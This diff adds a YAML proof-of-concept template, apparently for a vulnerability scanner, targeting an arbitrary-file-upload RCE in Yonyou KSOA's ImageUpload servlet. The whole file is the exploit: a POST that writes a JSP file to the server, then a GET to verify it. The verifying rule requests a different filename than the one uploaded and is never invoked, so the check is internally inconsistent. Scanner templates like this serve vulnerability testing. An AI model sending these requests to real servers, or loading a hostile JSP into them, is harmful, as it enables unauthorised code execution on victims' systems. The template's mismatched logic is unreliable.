@@ -1,0 +1,23 @@
+name: poc-yaml-yonyou_ksoa_imageupload_rce.yaml
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: >-
+        /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=testcmd111.jsp&_ZQA_ID=d0d60ec54924481c
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data
+      body: <% out.println("test"); %>
+    expression: response.status == 200 && response.body_string.contains("testcmd111.jsp")
+  r1:
+    request:
+      method: GET
+      path: /pictures/cmd11122.jsp
+      follow_redirects: false
+    expression: response.status == 200 && response.body_string.contains("test")
+expression: r0()
+detail:
+  author: ''
+  links: []
